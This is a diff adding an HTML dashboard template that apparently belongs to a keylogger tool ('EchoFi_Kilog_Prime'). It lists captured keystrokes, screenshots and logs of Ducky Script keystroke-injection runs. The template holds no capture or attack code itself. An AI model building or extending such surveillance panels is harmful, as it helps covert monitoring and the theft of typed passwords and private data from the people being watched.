@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+    <div align="center">
+
+  <img src="https://github.com/MrEchoFi/MrEchoFi/raw/4274f537dec313ac7dde4403fe0fae24259beade/Mr.EchoFi-New-Logo-with-ASCII.jpg" alt="logo" width="200" height="auto" />
+  
+   
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>{{ server_name }} Dashboard</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+</head>
+<body>
+    <header>
+        <h1>{{ server_name }}</h1>
+    </header>
+    <main>
+        {% if error %}
+            <p class="error">{{ error }}</p>
+        {% endif %}
+        <section>
+            <h2>Recent Keystrokes</h2>
+            {% if keystrokes %}
+                <ul>
+                    {% for keystroke in keystrokes %}
+                        <li>{{ keystroke.timestamp }}: {{ keystroke.key }}</li>
+                    {% endfor %}
+                </ul>
+            {% else %}
+                <p>No keystrokes recorded yet.</p>
+            {% endif %}
+        </section>
+        <section>
+            <h2>Recent Screenshots</h2>
+            {% if screenshots %}
+                <div class="gallery">
+                    {% for screenshot in screenshots %}
+                        <a href="{{ url_for('static', filename=screenshot.filepath) }}" target="_blank">
+                            <img src="{{ url_for('static', filename=screenshot.filepath) }}" alt="Screenshot at {{ screenshot.timestamp }}" onerror="this.alt='Image'; this.src='C:\Users\ENVY USER\OneDrive\Documents\EchoFi_Kilog_Prime\static\screenshots'">
+                        </a>
+                    {% endfor %}
+                </div>
+            {% else %}
+                <p>No screenshots recorded yet.</p>
+            {% endif %}
+        </section>
+        <section>
+            <h2>Recent Ducky Script Executions</h2>
+            {% if ducky_logs %}
+                <ul>
+                    {% for log in ducky_logs %}
+                        <li>{{ log.timestamp }}: [{{ log.status }}] {{ log.script }} - {{ log.output }}</li>
+                    {% endfor %}
+                </ul>
+            {% else %}
+                <p>No Ducky Script executions recorded yet.</p>
+            {% endif %}
+        </section>
+    </main>
+</body>
+</html>
